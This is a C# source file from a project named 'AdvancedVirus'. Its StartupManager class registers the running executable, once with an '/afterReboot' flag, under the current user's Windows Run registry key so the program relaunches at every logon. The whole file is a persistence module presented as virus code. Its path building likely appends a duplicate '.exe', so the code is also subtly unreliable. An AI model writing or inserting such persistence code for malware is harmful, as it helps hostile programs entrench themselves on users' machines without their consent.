using System;
using Microsoft.Win32;

namespace AdvancedVirus
{
    public class StartupManager
    {
        public void AddToStartup()
        {
            var path = AppDomain.CurrentDomain.BaseDirectory + AppDomain.CurrentDomain.FriendlyName + ".exe";
            string keyName = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";

            try
            {
                using (RegistryKey key = Registry.CurrentUser.OpenSubKey(keyName, true))
                {
                    key.SetValue(AppDomain.CurrentDomain.FriendlyName, path);
                    Console.WriteLine("Application successfully added to startup.");
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Startup error: {ex.Message}");
            }
        }

        public void AddToStartupWithParameter()
        {
            var path = "\"" + AppDomain.CurrentDomain.BaseDirectory + AppDomain.CurrentDomain.FriendlyName + ".exe\" /afterReboot";
            string keyName = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";

            try
            {
                using (RegistryKey key = Registry.CurrentUser.OpenSubKey(keyName, true))
                {
                    key.SetValue(AppDomain.CurrentDomain.FriendlyName, path);
                    Console.WriteLine("Application successfully added to startup with parameter.");
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Startup error: {ex.Message}");
            }
        }
    }
}